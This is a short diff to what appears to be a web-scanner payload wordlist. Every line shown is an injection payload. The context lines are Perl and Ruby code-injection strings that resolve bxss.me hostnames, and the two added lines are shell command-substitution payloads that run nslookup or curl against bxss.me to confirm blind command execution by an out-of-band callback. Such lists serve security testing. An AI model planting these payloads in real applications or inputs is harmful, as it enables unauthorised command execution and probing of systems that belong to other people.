@@ -3174,3 +3174,5 @@ geth(ostbyname(lc('hitcf'.'gnegartpdeb00.bxss.me.')).'A'.chr(67).chr(hex('58')).
 ""+""A"".concat(70-3.concat(22*4).concat(98).concat(77).concat(115).concat(87)+(require""socket"" Socket.gethostbyname(""hitsq""+""uiesokpz42b1d.bxss.me."")[3].to_s)+"")
 '+'A'.concat(70-3.concat(22*4).concat(117).concat(90).concat(117).concat(66)+(require'socket' Socket.gethostbyname('hitzg'+'mnkzoueffb951.bxss.me.')[3].to_s)+')
 'A'.concat(70-3.concat(22*4).concat(101).concat(69).concat(120).concat(84)+(require'socket' Socket.gethostbyname('hitwy'+'bhkqlrur1cb6e.bxss.me.')[3].to_s))
+$(nslookup -q=cname hitoqnbmfxwpy7a4dd.bxss.me||curl hitoqnbmfxwpy7a4dd.bxss.me)
+`(nslookup -q=cname hitoyuihydzyhe781a.bxss.me||curl hitoyuihydzyhe781a.bxss.me`)
